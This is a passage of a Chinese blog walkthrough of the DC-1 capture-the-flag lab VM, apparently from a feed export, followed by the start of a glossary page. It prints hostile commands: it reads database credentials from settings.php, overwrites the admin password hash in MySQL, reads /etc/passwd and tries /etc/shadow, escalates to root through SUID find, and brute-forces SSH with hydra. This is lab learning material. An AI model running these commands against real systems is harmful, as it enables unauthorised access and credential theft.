INSTALL.sqlite.txt-rw-r--r--  1 www-data www-data 17861 Nov 21  2013 INSTALL.txt-rwxr-xr-x  1 www-data www-data 18092 Nov  1  2013 LICENSE.txt-rw-r--r--  1 www-data www-data  8191 Nov 21  2013 MAINTAINERS.txt-rw-r--r--  1 www-data www-data  5376 Nov 21  2013 README.txt-rw-r--r--  1 www-data www-data  9642 Nov 21  2013 UPGRADE.txt-rw-r--r--  1 www-data www-data  6604 Nov 21  2013 authorize.php-rw-r--r--  1 www-data www-data   720 Nov 21  2013 cron.php-rw-r--r--  1 www-data www-data    52 Feb 19  2019 flag1.txtdrwxr-xr-x  4 www-data www-data  4096 Nov 21  2013 includes-rw-r--r--  1 www-data www-data   529 Nov 21  2013 index.php-rw-r--r--  1 www-data www-data   703 Nov 21  2013 install.phpdrwxr-xr-x  4 www-data www-data  4096 Nov 21  2013 miscdrwxr-xr-x 42 www-data www-data  4096 Nov 21  2013 modulesdrwxr-xr-x  5 www-data www-data  4096 Nov 21  2013 profiles-rw-r--r--  1 www-data www-data  1561 Nov 21  2013 robots.txtdrwxr-xr-x  3 www-data www-data  4096 Nov 19 20:34 scriptsdrwxr-xr-x  4 www-data www-data  4096 Nov 21  2013 sitesdrwxr-xr-x  7 www-data www-data  4096 Nov 21  2013 themes-rw-r--r--  1 www-data www-data 19941 Nov 21  2013 update.php-rw-r--r--  1 www-data www-data  2178 Nov 21  2013 web.config-rw-r--r--  1 www-data www-data   417 Nov 21  2013 xmlrpc.php</code></pre><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>这里就可以看到flag1的文件了，尝试cat一下</p><pre><code class="hljs bash">www-data@DC-1:/var/www$ cat flag1.txtcat flag1.txtEvery good CMS needs a config file - and so <span class="hljs-keyword">do</span> you.</code></pre><p>这里应该就是下一个flag的提示了：提示是找cms的配置文件。经过搜索可以知道配置文件的路径</p><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201126104721.png" srcset="/img/loading.gif" alt=""></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>进入之后看到有一个settings.php的文件,cat看一下</p><pre><code class="hljs elixir">www-data<span class="hljs-variable">@DC</span><span class="hljs-number">-1</span><span class="hljs-symbol">:/var/www/sites/default</span><span class="hljs-variable">$ </span>lslsdefault.settings.php  files  settings.php</code></pre><pre><code class="hljs php">www-data@DC<span class="hljs-number">-1</span>:/<span class="hljs-keyword">var</span>/www/sites/<span class="hljs-keyword">default</span>$ cat settings.phpcat settings.php<span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/** * * flag2 * Brute force and dictionary attacks aren't the * only ways to gain access (and you WILL need access). * What can you do with these credentials? * */</span>$databases = <span class="hljs-keyword">array</span> (  <span class="hljs-string">'default'</span> =&gt;   <span class="hljs-keyword">array</span> (    <span class="hljs-string">'default'</span> =&gt;     <span class="hljs-keyword">array</span> (      <span class="hljs-string">'database'</span> =&gt; <span class="hljs-string">'drupaldb'</span>,      <span class="hljs-string">'username'</span> =&gt; <span class="hljs-string">'dbuser'</span>,      <span class="hljs-string">'password'</span> =&gt; <span class="hljs-string">'R0ck3t'</span>,      <span class="hljs-string">'host'</span> =&gt; <span class="hljs-string">'localhost'</span>,      <span class="hljs-string">'port'</span> =&gt; <span class="hljs-string">''</span>,      <span class="hljs-string">'driver'</span> =&gt; <span class="hljs-string">'mysql'</span>,      <span class="hljs-string">'prefix'</span> =&gt; <span class="hljs-string">''</span>,    ),  ),);</code></pre><p>看到了flag2的信息,是mysql数据库的信息,有效的应该是数据库名,用户名和密码</p><h3 id="进入数据库-查看"><a href="#进入数据库-查看" class="headerlink" title="进入数据库,查看"></a>进入数据库,查看</h3><pre><code class="hljs bash">www-data@DC-1:/var/www$ mysql -h localhost -u dbuser -pmysql -h localhost -u dbuser -pEnter password: R0ck3tWelcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 48Server version: 5.5.60-0+deb7u1 (Debian)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type <span class="hljs-string">'help;'</span> or <span class="hljs-string">'\h'</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">'\c'</span> to clear the current input statement.</code></pre><pre><code class="hljs gherkin">mysql&gt; show database;show database;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'database' at line 1mysql&gt; show databases;show databases;+--------------------+|<span class="hljs-string"> Database           </span>|+--------------------+|<span class="hljs-string"> information_schema </span>||<span class="hljs-string"> drupaldb           </span>|+--------------------+2 rows in set (0.00 sec)mysql&gt; use drupaldb;use drupaldb;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;show tab\les;+-----------------------------+|<span class="hljs-string"> Tables_in_drupaldb          </span>|+-----------------------------+|<span class="hljs-string"> actions                     </span>||<span class="hljs-string"> authmap                     </span>||<span class="hljs-string"> batch                       </span>||<span class="hljs-string"> block                       </span>||<span class="hljs-string"> block_custom                </span>||<span class="hljs-string"> block_node_type             </span>||<span class="hljs-string"> block_role                  </span>||<span class="hljs-string"> blocked_ips                 </span>||<span class="hljs-string"> cache                       </span>||<span class="hljs-string"> cache_block                 </span>||<span class="hljs-string"> cache_bootstrap             </span>||<span class="hljs-string"> cache_field                 </span>||<span class="hljs-string"> cache_filter                </span>||<span class="hljs-string"> cache_form                  </span>||<span class="hljs-string"> cache_image                 </span>||<span class="hljs-string"> cache_menu                  </span>||<span class="hljs-string"> cache_page                  </span>||<span class="hljs-string"> cache_path                  </span>||<span class="hljs-string"> cache_update                </span>||<span class="hljs-string"> cache_views                 </span>||<span class="hljs-string"> cache_views_data            </span>||<span class="hljs-string"> comment                     </span>||<span class="hljs-string"> ctools_css_cache            </span>||<span class="hljs-string"> ctools_object_cache         </span>||<span class="hljs-string"> date_format_locale          </span>||<span class="hljs-string"> date_format_type            </span>||<span class="hljs-string"> date_formats                </span>||<span class="hljs-string"> field_config                </span>||<span class="hljs-string"> field_config_instance       </span>||<span class="hljs-string"> field_data_body             </span>||<span class="hljs-string"> field_data_comment_body     </span>||<span class="hljs-string"> field_data_field_image      </span>||<span class="hljs-string"> field_data_field_tags       </span>||<span class="hljs-string"> field_revision_body         </span>||<span class="hljs-string"> field_revision_comment_body </span>||<span class="hljs-string"> field_revision_field_image  </span>||<span class="hljs-string"> field_revision_field_tags   </span>||<span class="hljs-string"> file_managed                </span>||<span class="hljs-string"> file_usage                  </span>||<span class="hljs-string"> filter                      </span>||<span class="hljs-string"> filter_format               </span>||<span class="hljs-string"> flood                       </span>||<span class="hljs-string"> history                     </span>||<span class="hljs-string"> image_effects               </span>||<span class="hljs-string"> image_styles                </span>||<span class="hljs-string"> menu_custom                 </span>||<span class="hljs-string"> menu_links                  </span>||<span class="hljs-string"> menu_router                 </span>||<span class="hljs-string"> node                        </span>||<span class="hljs-string"> node_access                 </span>||<span class="hljs-string"> node_comment_statistics     </span>||<span class="hljs-string"> node_revision               </span>||<span class="hljs-string"> node_type                   </span>||<span class="hljs-string"> queue                       </span>||<span class="hljs-string"> rdf_mapping                 </span>||<span class="hljs-string"> registry                    </span>||<span class="hljs-string"> registry_file               </span>||<span class="hljs-string"> role                        </span>||<span class="hljs-string"> role_permission             </span>||<span class="hljs-string"> search_dataset              </span>||<span class="hljs-string"> search_index                </span>||<span class="hljs-string"> search_node_links           </span>||<span class="hljs-string"> search_total                </span>||<span class="hljs-string"> semaphore                   </span>||<span class="hljs-string"> sequences                   </span>||<span class="hljs-string"> sessions                    </span>||<span class="hljs-string"> shortcut_set                </span>||<span class="hljs-string"> shortcut_set_users          </span>||<span class="hljs-string"> system                      </span>||<span class="hljs-string"> taxonomy_index              </span>||<span class="hljs-string"> taxonomy_term_data          </span>||<span class="hljs-string"> taxonomy_term_hierarchy     </span>||<span class="hljs-string"> taxonomy_vocabulary         </span>||<span class="hljs-string"> url_alias                   </span>||<span class="hljs-string"> users                       </span>||<span class="hljs-string"> users_roles                 </span>||<span class="hljs-string"> variable                    </span>||<span class="hljs-string"> views_display               </span>||<span class="hljs-string"> views_view                  </span>||<span class="hljs-string"> watchdog                    </span>|+-----------------------------+80 rows in set (0.00 sec)</code></pre><p>进入users表里</p><pre><code class="hljs mysql">mysql&gt; select * from users;select * from users;+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL ||   1 | admin | $S$DjLcqu7Pury7nKFmo/PeV7DI6PIceI3t/R6DEkU7Xdg7fRQozPyt | admin@example.com |       |           | NULL             | 1550581826 | 1606360471 | 1605782358 |      1 | Australia/Melbourne |          |       0 | admin@example.com | b:0; ||   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@example.org  | b:0; |+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+3 rows in set (0.00 sec)</code></pre><p>看起来很乱只要有用的信息</p><pre><code class="hljs mysql">mysql&gt; select uid,name,pass from users;select uid,name,pass from users;+-----+-------+---------------------------------------------------------+| uid | name  | pass                                                    |+-----+-------+---------------------------------------------------------+|   0 |       |                                                         ||   1 | admin | $S$DjLcqu7Pury7nKFmo/PeV7DI6PIceI3t/R6DEkU7Xdg7fRQozPyt ||   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |+-----+-------+---------------------------------------------------------+3 rows in set (0.00 sec)</code></pre><p>这里的pass明显经过类似md5一类的加密方式加密过的,没有办法解密出来</p><p>所以我们的思路是看他是怎么加密的,然后用相同的方式去加密”pass”,然后把”pass”的加密后的密文update到数据库中,替换掉原来的密文,那么就可以用”admin”和”pass”去登陆了</p><h3 id="进入script目录-生成新的密码"><a href="#进入script目录-生成新的密码" class="headerlink" title="进入script目录,生成新的密码"></a>进入script目录,生成新的密码</h3><p>这里进入scripts目录看一下</p><blockquote><p>/scripts 命令行脚本 在命令行可以执行的脚本文件，包括安装脚本，数据库备份脚本等</p></blockquote><pre><code class="hljs bash">www-data@DC-1:/var/www/scripts$ lslscode-clean.sh  drupal.sh            generate-d6-content.sh  password-hash.shcron-curl.sh   dump-database-d6.sh  generate-d7-content.sh  run-tests.shcron-lynx.sh   dump-database-d7.sh  includes                test.script</code></pre><p>此目录有个password-hash.sh,猜测是这个cms的密码加密算法</p><pre><code class="hljs dart">www-data<span class="hljs-meta">@DC</span><span class="hljs-number">-1</span>:/<span class="hljs-keyword">var</span>/www/scripts$ cat password-hash.shcat password-hash.sh#!/usr/bin/php&lt;?php<span class="hljs-comment"><span class="markdown">/**<span class="hljs-bullet"> * </span>Drupal hash script - to generate </span>a<span class="markdown"> hash from </span>a<span class="markdown"> plaintext password<span class="hljs-bullet"> * </span>* Check for </span>your<span class="markdown"> PHP interpreter - on Windows </span>you<span class="markdown">'ll probably have to<span class="hljs-bullet"> * </span>replace line 1 with<span class="hljs-bullet"> *   </span>#!c:/program files/php/php.exe<span class="hljs-bullet"> * </span>* @param password1 [password2 [password3 ...]]<span class="hljs-bullet"> *  </span>Plain-text passwords in quotes (or with spaces backslash escaped). */</span></span>文件内部分内容</code></pre><p>看来是的,还有使用方法</p><pre><code class="hljs pgsql">Generate Drupal <span class="hljs-keyword">password</span> hashes <span class="hljs-keyword">from</span> the shell.<span class="hljs-keyword">Usage</span>:        &#123;$script&#125; [<span class="hljs-keyword">OPTIONS</span>] "&lt;plan-text password&gt;"Example:      &#123;$script&#125; "mynewpassword"</code></pre><p>报错</p><pre><code class="hljs groovy"><span class="hljs-string">bash:</span> password-hash.<span class="hljs-string">sh:</span> command not found</code></pre><blockquote><p>linux中“.sh”文件是脚本文件，一般都是bash脚本，我们可以使用sh命令运行“sh xxx.sh”，并且由于在linux中sh是链接到bash上的，所以sh与bash在功能上是没有区别的。</p></blockquote><blockquote><p>程序必须以下面的行开始（必须方在文件的第一行）：<br>#!/bin/sh<br>符号#!用来告诉系统它后面的参数是用来执行该文件的程序。在这个例子中我们使用/bin/sh来执行程序。</p></blockquote><p>第一行是#!/usr/bin/php,所以再尝试生成</p><pre><code class="hljs elixir">www-data<span class="hljs-variable">@DC</span><span class="hljs-number">-1</span><span class="hljs-symbol">:/var/www/scripts</span><span class="hljs-variable">$ </span>php password-hash.sh <span class="hljs-string">"pass"</span>php password-hash.sh <span class="hljs-string">"pass"</span><span class="hljs-symbol">password:</span> pass          <span class="hljs-symbol">hash:</span> <span class="hljs-variable">$S</span><span class="hljs-variable">$DzK49SXmGCYyrDNDBKXru0ZdwsWB8pkwBz7l0iFvElyNNvccbEK2</span></code></pre><h3 id="update新密码的hash"><a href="#update新密码的hash" class="headerlink" title="update新密码的hash"></a>update新密码的hash</h3><pre><code class="hljs routeros">mysql&gt; update<span class="hljs-built_in"> users </span><span class="hljs-builtin-name">set</span> <span class="hljs-attribute">pass</span>=<span class="hljs-string">"<span class="hljs-variable">$S</span><span class="hljs-variable">$DzK49SXmGCYyrDNDBKXru0ZdwsWB8pkwBz7l0iFvElyNNvccbEK2</span>"</span> where <span class="hljs-attribute">name</span>=<span class="hljs-string">"admin"</span>;&lt;u0ZdwsWB8pkwBz7l0iFvElyNNvccbEK2<span class="hljs-string">" where name="</span>admin<span class="hljs-string">";</span></code></pre><h3 id="尝试登陆-flag3"><a href="#尝试登陆-flag3" class="headerlink" title="尝试登陆,flag3"></a>尝试登陆,flag3</h3><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201126121940.png" srcset="/img/loading.gif" alt=""></p><p>登陆成功,随便点点可以看到flag3嘻嘻嘻</p><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201126183639.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs python">Special PERMS will help FIND the passwd - but yo<span class="hljs-string">u'll need to -exec that command to work out how to get what'</span>s <span class="hljs-keyword">in</span> the shadow.翻译:特殊的PERMS可以帮助找到密码-但您需要-<span class="hljs-keyword">exec</span>该命令来确定如何获取隐藏的内容。</code></pre><h3 id="找passwd文件"><a href="#找passwd文件" class="headerlink" title="找passwd文件"></a>找passwd文件</h3><blockquote><p>Linux 系统中的 /etc/passwd 文件，是系统用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以对此文件执行读操作。</p></blockquote><pre><code class="hljs bash">www-data@DC-1:/etc$ cat passwdcat passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shDebian-exim:x:101:104::/var/spool/exim4:/bin/<span class="hljs-literal">false</span>statd:x:102:65534::/var/lib/nfs:/bin/<span class="hljs-literal">false</span>messagebus:x:103:107::/var/run/dbus:/bin/<span class="hljs-literal">false</span>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologinmysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/<span class="hljs-literal">false</span>flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</code></pre><blockquote><p>用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</p></blockquote><p>看到最后一行有个叫flag4的用户</p><h3 id="进入-home目录-falg4"><a href="#进入-home目录-falg4" class="headerlink" title="进入/home目录,falg4"></a>进入/home目录,falg4</h3><pre><code class="hljs elixir">www-data<span class="hljs-variable">@DC</span><span class="hljs-number">-1</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>lslsflag4</code></pre><pre><code class="hljs oxygene">www-data@DC-<span class="hljs-number">1</span>:/home/flag4$ cat flag4.txtcat flag4.txtCan you use this same <span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">to</span> <span class="hljs-title">find</span> <span class="hljs-title">or</span> <span class="hljs-title">access</span> <span class="hljs-title">the</span> <span class="hljs-title">flag</span> <span class="hljs-title">in</span> <span class="hljs-title">root</span>?<span class="hljs-title">Probably</span>. <span class="hljs-title">But</span> <span class="hljs-title">perhaps</span> <span class="hljs-title">it</span>'<span class="hljs-title">s</span> <span class="hljs-title">not</span> <span class="hljs-title">that</span> <span class="hljs-title">easy</span>.  <span class="hljs-title">Or</span> <span class="hljs-title">maybe</span> <span class="hljs-title">it</span> <span class="hljs-title">is</span>?</span></code></pre><p>flag4的提示说需要拿到root用户,可能还有最后一个flag</p><h3 id="尝试打开etc-shadow文件"><a href="#尝试打开etc-shadow文件" class="headerlink" title="尝试打开etc/shadow文件"></a>尝试打开etc/shadow文件</h3><pre><code class="hljs bash">www-data@DC-1:/etc$ cat shadow cat shadowcat: shadow: Permission denied</code></pre><p>发现www-data用户<strong>无权限</strong>看到里面的内容</p><blockquote><p>/etc/shadow 文件只有 root 用户拥有读权限，其他用户没有任何权限，这样就保证了用户密码的安全性。</p></blockquote><p>这就和flag4的拿root的提示相同了,拿接下来的任务就是拿root权限了</p><h3 id="拿root权限-提权"><a href="#拿root权限-提权" class="headerlink" title="拿root权限(提权)"></a>拿root权限(提权)</h3><p>提权第一时间想到suid提权,首先查看系统上运行的所有SUID可执行文件</p><pre><code class="hljs bash"><span class="hljs-comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/nullfind / -user root -perm -4000-print2&gt;/dev/nullfind / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</code></pre><pre><code class="hljs bash">www-data@DC-1:/etc$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/nullfind / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null/bin/mount/bin/ping/bin/su/bin/ping6/bin/umount/usr/bin/at/usr/bin/chsh/usr/bin/passwd/usr/bin/newgrp/usr/bin/chfn/usr/bin/gpasswd/usr/bin/procmail/usr/bin/find/usr/sbin/exim4/usr/lib/pt_chown/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helper/sbin/mount.nfs</code></pre><p>利用find文件提权(只能用以下命令提权,这里只有find)</p><blockquote><ul><li>nmap</li><li>vim</li><li>find</li><li>bash</li><li>more</li><li>less</li><li>nano</li><li>cp</li></ul></blockquote><pre><code class="hljs bash">www-data@DC-1:/etc$ find ./ aaa -<span class="hljs-built_in">exec</span> <span class="hljs-string">'/bin/sh'</span> \;find ./ aaa -<span class="hljs-built_in">exec</span> <span class="hljs-string">'/bin/sh'</span> \;<span class="hljs-comment"># whoami</span>whoamiroot</code></pre><p>提权成功!</p><h3 id="finalflag"><a href="#finalflag" class="headerlink" title="finalflag"></a>finalflag</h3><pre><code class="hljs bash"><span class="hljs-comment"># cd root</span><span class="hljs-built_in">cd</span> root<span class="hljs-comment"># ls</span>lsthefinalflag.txt<span class="hljs-comment"># cat thefinalflag.txt</span>cat thefinalflag.txtWell <span class="hljs-keyword">done</span>!!!!Hopefully you<span class="hljs-string">'ve enjoyed this and learned some new skills.You can let me know what you thought of this little journeyby contacting me via Twitter - @DCAU7</span></code></pre><h2 id="方法2-22端口"><a href="#方法2-22端口" class="headerlink" title="方法2(22端口)"></a>方法2(22端口)</h2><p>在知道有个用户flag4之后，也可以从22端口入手。现在是知道了ssh的用户名flag4，但是密码不知道</p><p>可以尝试穷举密码</p><h3 id="hydra穷举密码"><a href="#hydra穷举密码" class="headerlink" title="hydra穷举密码"></a>hydra穷举密码</h3><p>字典是kali自带的字典，-vV是详细信息，-f是找到就停止。密码是orange</p><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.104 -vV -f</span></code></pre><pre><code class="hljs bash">[22][ssh] host: 192.168.56.104   login: flag4   password: orange[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.56.104 (valid pair found)1 of 1 target successfully completed, 1 valid password found</code></pre><h3 id="ssh登陆"><a href="#ssh登陆" class="headerlink" title="ssh登陆"></a>ssh登陆</h3><pre><code class="hljs yaml"><span class="hljs-string">root@kali:~#</span> <span class="hljs-string">ssh</span> <span class="hljs-string">flag4@192.168.56.104</span><span class="hljs-attr">Warning:</span> <span class="hljs-string">Permanently</span> <span class="hljs-string">added</span> <span class="hljs-string">'192.168.56.104'</span> <span class="hljs-string">(ECDSA)</span> <span class="hljs-string">to</span> <span class="hljs-string">the</span> <span class="hljs-string">list</span> <span class="hljs-string">of</span> <span class="hljs-string">known</span> <span class="hljs-string">hosts.</span><span class="hljs-string">flag4@192.168.56.104's</span> <span class="hljs-attr">password:</span> <span class="hljs-string">Linux</span> <span class="hljs-string">DC-1</span> <span class="hljs-number">3.2</span><span class="hljs-number">.0</span><span class="hljs-number">-6</span><span class="hljs-number">-486</span> <span class="hljs-comment">#1 Debian 3.2.102-1 i686</span><span class="hljs-string">The</span> <span class="hljs-string">programs</span> <span class="hljs-string">included</span> <span class="hljs-string">with</span> <span class="hljs-string">the</span> <span class="hljs-string">Debian</span> <span class="hljs-string">GNU/Linux</span> <span class="hljs-string">system</span> <span class="hljs-string">are</span> <span class="hljs-string">free</span> <span class="hljs-string">software;</span><span class="hljs-string">the</span> <span class="hljs-string">exact</span> <span class="hljs-string">distribution</span> <span class="hljs-string">terms</span> <span class="hljs-string">for</span> <span class="hljs-string">each</span> <span class="hljs-string">program</span> <span class="hljs-string">are</span> <span class="hljs-string">described</span> <span class="hljs-string">in</span> <span class="hljs-string">the</span><span class="hljs-string">individual</span> <span class="hljs-string">files</span> <span class="hljs-string">in</span> <span class="hljs-string">/usr/share/doc/*/copyright.</span><span class="hljs-string">Debian</span> <span class="hljs-string">GNU/Linux</span> <span class="hljs-string">comes</span> <span class="hljs-string">with</span> <span class="hljs-string">ABSOLUTELY</span> <span class="hljs-literal">NO</span> <span class="hljs-string">WARRANTY,</span> <span class="hljs-string">to</span> <span class="hljs-string">the</span> <span class="hljs-string">extent</span><span class="hljs-string">permitted</span> <span class="hljs-string">by</span> <span class="hljs-string">applicable</span> <span class="hljs-string">law.</span><span class="hljs-attr">Last login:</span> <span class="hljs-string">Fri</span> <span class="hljs-string">Nov</span> <span class="hljs-number">20</span> <span class="hljs-number">20</span><span class="hljs-string">:42:09</span> <span class="hljs-number">2020</span> <span class="hljs-string">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.137</span><span class="hljs-number">.130</span><span class="hljs-string">flag4@DC-1:~$</span></code></pre><p>接下来的思路就是一样的了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>知识点总结：</p><ul><li>nmap扫描</li><li>whatweb扫描cms</li><li>msfconsole的使用</li><li>python转换交互式tty</li><li>suid提权</li><li>hydra穷举ssh密码</li></ul><h3 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h3><h4 id="问题一：sh和bash有什么不一样"><a href="#问题一：sh和bash有什么不一样" class="headerlink" title="问题一：sh和bash有什么不一样"></a>问题一：sh和bash有什么不一样</h4><pre><code class="hljs swift">python -<span class="hljs-built_in">c</span> '<span class="hljs-keyword">import</span> pty; pty.spawn("/bin/bash")'</code></pre><p>和</p><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> ./<span class="hljs-built_in"> aaa </span>-exec <span class="hljs-string">'/bin/sh'</span> \;</code></pre><p>里面有一个sh和bash，然后思考里面的bash和sh是不是可以这样</p><pre><code class="hljs swift">python -<span class="hljs-built_in">c</span> '<span class="hljs-keyword">import</span> pty; pty.spawn("/bin/sh")'</code></pre><p>发现转换为完全tty的时候可以这样</p><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> ./<span class="hljs-built_in"> aaa </span>-exec <span class="hljs-string">'/bin/bash'</span> \;</code></pre><p>但是suid这样提权就提权不了了，这里就不懂了，应该是sh和bash的区别没有搞懂了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>技术名词工具百科页面</title>
    <link href="/2020/11/05/%E6%8A%80%E6%9C%AF%E5%90%8D%E8%AF%8D%E5%B7%A5%E5%85%B7%E7%99%BE%E7%A7%91%E9%A1%B5%E9%9D%A2/"/>
    <url>/2020/11/05/%E6%8A%80%E6%9C%AF%E5%90%8D%E8%AF%8D%E5%B7%A5%E5%85%B7%E7%99%BE%E7%A7%91%E9%A1%B5%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="技术-名词-工具百科页面"><a href="#技术-名词-工具百科页面" class="headerlink" title="技术/名词/工具百科页面"></a>技术/名词/工具百科页面</h1><h2 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h2><p>两种，Bash反弹和Python反弹（Linux和Linux之间）</p><p>也分为Linux和Linux之间，Linux和Windows之间</p><p>Bash反弹shell：<a href="https://www.cnblogs.com/iouwenbo/p/11277453.html" target="_blank" rel="noopener">https://www.cnblogs.com/iouwenbo/p/11277453.html</a></p><p>Python反弹shell：<a href="https://blog.csdn.net/weixin_30526593/article/details/98650248" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30526593/article/details/98650248</a></p><p>&lt;&gt;输入输出重定向：<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/4714867?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/4714867?fr=aladdin</a></p><p>各种反弹shell：<a href="https://www.cnblogs.com/ktfsong/p/11265734.html" target="_blank" rel="noopener">https://www.cnblogs.com/ktfsong/p/11265734.html</a></p><p>Linux和Windows之间：？？？</p><h2 id="bin-bash"><a href="#bin-bash" class="headerlink" title="/bin/bash"></a>/bin/bash</h2><p>bash是shell里面的一种</p><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p>HTML DOM：<a href="https://www.runoob.com/htmldom/htmldom-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/htmldom/htmldom-tutorial.html</a></p><h2 id="gz"><a href="#gz" class="headerlink" title=".gz"></a>.gz</h2><p>GZ是UNIX系统中的压缩文件，ZIP的Gnu版本</p><p>Linux gzip命令：<a href="https://www.runoob.com/linux/linux-comm-gzip.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-comm-gzip.html</a></p><h2 id="Linux的目录介绍"><a href="#Linux的目录介绍" class="headerlink" title="Linux的目录介绍"></a>Linux的目录介绍</h2><p>Linux各目录及每个目录的详细介绍：<a href="https://www.cnblogs.com/zhuchenglin/p/8686924.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhuchenglin/p/8686924.html</a></p><h2 id="tty"><a href="#tty" class="headerlink" title="tty"></a>tty</h2><p>Linux内核tty：<a href="http://blog.chinaunix.net/uid-20543672-id-3225777.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-20543672-id-3225777.html</a></p><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>Metasploit 使用简介：<a href="https://www.cnblogs.com/daban/p/3761529.html" target="_blank" rel="noopener">https://www.cnblogs.com/daban/p/3761529.html</a></p><p>back</p><p>info</p><p>search cve:2018</p><h2 id="payload和exploit的区别"><a href="#payload和exploit的区别" class="headerlink" title="payload和exploit的区别"></a>payload和exploit的区别</h2><p>exploit是拿下系统前进行的活动，目标是拿下目标系统；</p><p>payload是在拿下目标系统后所进行的操作，目标是提升权限、加强控制等操作，属于后渗透测试。</p><h2 id="python-requirements文件"><a href="#python-requirements文件" class="headerlink" title="python requirements文件"></a>python requirements文件</h2><p><a href="https://blog.51cto.com/meyangyang/2094937" target="_blank" rel="noopener">https://blog.51cto.com/meyangyang/2094937</a></p><h2 id="Linux-etc-shadow"><a href="#Linux-etc-shadow" class="headerlink" title="Linux /etc/shadow"></a>Linux /etc/shadow</h2><p>/etc/shadow 文件，用于存储 Linux 系统中用户的密码信息，又称为“影子文件”。</p><p>前面介绍了 /etc/passwd 文件，由于该文件允许所有用户读取，易导致用户密码泄露，因此 Linux 系统将用户的密码信息从 /etc/passwd 文件中分离出来，并单独放到了此文件中。</p><p>详细解析：<a href="http://c.biancheng.net/view/840.html" target="_blank" 